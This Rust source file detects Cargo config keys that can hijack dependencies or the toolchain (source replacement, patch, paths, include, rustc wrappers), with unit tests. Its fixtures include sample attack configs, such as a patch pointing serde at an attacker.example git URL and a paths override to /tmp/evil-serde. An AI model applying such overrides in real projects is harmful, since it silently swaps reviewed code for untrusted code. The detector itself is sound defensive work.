use thiserror::Error;

/// Cargo config keys that let `.cargo/config.toml` (or legacy
/// `.cargo/config`) repoint an already-reviewed crate name away from its
/// reviewed source without touching `Cargo.toml` or `Cargo.lock`:
/// Cargo `include`, `[source.*]` source replacement, config-defined
/// `[patch.*]` (stable since Rust 1.56, works exactly like a manifest
/// `[patch]`), and top-level `paths` dependency overrides. Includes are
/// blocked because the imported source effect is not established. The mere
/// presence of any of these keys must be treated as a fail-closed finding
/// wherever reviewed families are active.
const SOURCE_OVERRIDE_KEYS: [&str; 3] = ["source", "patch", "paths"];

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct CargoToolchainExecutableControl {
    pub build_key: &'static str,
    pub config_key: &'static str,
    pub environment_names: &'static [&'static str],
}

/// Cargo inputs that can replace or interpose on a standard Rust toolchain
/// executable. Keeping each mechanism's config and environment spellings
/// together prevents one gate surface from drifting independently of another.
pub const CARGO_TOOLCHAIN_EXECUTABLE_CONTROLS: [CargoToolchainExecutableControl; 4] = [
    CargoToolchainExecutableControl {
        build_key: "rustc",
        config_key: "build.rustc",
        environment_names: &["RUSTC", "CARGO_BUILD_RUSTC"],
    },
    CargoToolchainExecutableControl {
        build_key: "rustc-wrapper",
        config_key: "build.rustc-wrapper",
        environment_names: &["RUSTC_WRAPPER", "CARGO_BUILD_RUSTC_WRAPPER"],
    },
    CargoToolchainExecutableControl {
        build_key: "rustc-workspace-wrapper",
        config_key: "build.rustc-workspace-wrapper",
        environment_names: &[
            "RUSTC_WORKSPACE_WRAPPER",
            "CARGO_BUILD_RUSTC_WORKSPACE_WRAPPER",
        ],
    },
    CargoToolchainExecutableControl {
        build_key: "rustdoc",
        config_key: "build.rustdoc",
        environment_names: &["RUSTDOC", "CARGO_BUILD_RUSTDOC"],
    },
];

fn parse_cargo_config(text: &str) -> Result<toml::Table, CargoConfigError> {
    let value: toml::Value = toml::from_str(text).map_err(CargoConfigError::Parse)?;
    match value {
        toml::Value::Table(table) => Ok(table),
        _ => Err(CargoConfigError::ExpectedTable),
    }
}

fn has_indirect_configuration(table: &toml::Table) -> bool {
    table.contains_key("include")
}

/// Returns the first cargo config key from [`SOURCE_OVERRIDE_KEYS`] present
/// in the given `.cargo/config.toml` text, if any.
pub fn cargo_config_source_override_key(
    text: &str,
) -> Result<Option<&'static str>, CargoConfigError> {
    let table = parse_cargo_config(text)?;

    if has_indirect_configuration(&table) {
        return Ok(Some("include"));
    }

    Ok(SOURCE_OVERRIDE_KEYS
        .into_iter()
        .find(|key| table.contains_key(*key)))
}

/// Reports Cargo configuration that can redirect a Rust toolchain executable
/// or import further configuration whose toolchain effect is not established.
pub fn cargo_config_toolchain_executable_control_key(
    text: &str,
) -> Result<Option<&'static str>, CargoConfigError> {
    let table = parse_cargo_config(text)?;

    if has_indirect_configuration(&table) {
        return Ok(Some("include"));
    }

    let Some(build) = table.get("build").and_then(toml::Value::as_table) else {
        return Ok(None);
    };

    Ok(CARGO_TOOLCHAIN_EXECUTABLE_CONTROLS
        .into_iter()
        .find_map(|control| {
            build
                .contains_key(control.build_key)
                .then_some(control.config_key)
        }))
}

#[derive(Debug, Error)]
pub enum CargoConfigError {
    #[error("unable to parse cargo config: {0}")]
    Parse(#[source] toml::de::Error),
    #[error("cargo config root must be a TOML table")]
    ExpectedTable,
}

#[cfg(test)]
mod tests {
    use super::{
        CargoConfigError, cargo_config_source_override_key,
        cargo_config_toolchain_executable_control_key,
    };

    #[test]
    fn detects_source_replacement_tables() {
        let key = cargo_config_source_override_key(
            r#"
[source.crates-io]
replace-with = "internal-mirror"

[source.internal-mirror]
registry = "https://internal.example/index"
"#,
        )
        .expect("cargo config should parse");

        assert_eq!(key, Some("source"));
    }

    #[test]
    fn detects_config_defined_patch_tables() {
        let key = cargo_config_source_override_key(
            r#"
[patch.crates-io]
serde = { git = "https://attacker.example/serde" }
"#,
        )
        .expect("cargo config should parse");

        assert_eq!(key, Some("patch"));
    }

    #[test]
    fn detects_top_level_paths_overrides() {
        let key = cargo_config_source_override_key(
            r#"
paths = ["/tmp/evil-serde"]
"#,
        )
        .expect("cargo config should parse");

        assert_eq!(key, Some("paths"));
    }

    #[test]
    fn does_not_flag_config_without_an_override_key() {
        let key = cargo_config_source_override_key(
            r#"
[net]
retry = 3
"#,
        )
        .expect("cargo config should parse");

        assert_eq!(key, None);
    }

    #[test]
    fn detects_every_build_toolchain_executable_control() {
        for (key, expected) in [
            ("rustc", "build.rustc"),
            ("rustc-wrapper", "build.rustc-wrapper"),
            ("rustc-workspace-wrapper", "build.rustc-workspace-wrapper"),
            ("rustdoc", "build.rustdoc"),
        ] {
            assert_eq!(
                cargo_config_toolchain_executable_control_key(&format!(
                    r#"
[build]
{key} = "/opt/custom/compiler-control"
"#,
                ))
                .expect("config should parse"),
                Some(expected)
            );
        }
        assert!(
            cargo_config_toolchain_executable_control_key("[build]\njobs = 4\n")
                .expect("config should parse")
                .is_none()
        );
    }

    #[test]
    fn detects_indirect_included_configuration() {
        assert_eq!(
            cargo_config_toolchain_executable_control_key("include = ['shared.toml']\n")
                .expect("config should parse"),
            Some("include")
        );
    }

    #[test]
    fn treats_included_configuration_as_an_unknown_source_effect() {
        assert_eq!(
            cargo_config_source_override_key("include = ['shared.toml']\n")
                .expect("config should parse"),
            Some("include")
        );
    }

    #[test]
    fn rejects_unparseable_cargo_config() {
        let error =
            cargo_config_source_override_key("not = valid = toml").expect_err("config should fail");

        assert!(matches!(error, CargoConfigError::Parse(_)));
    }
}
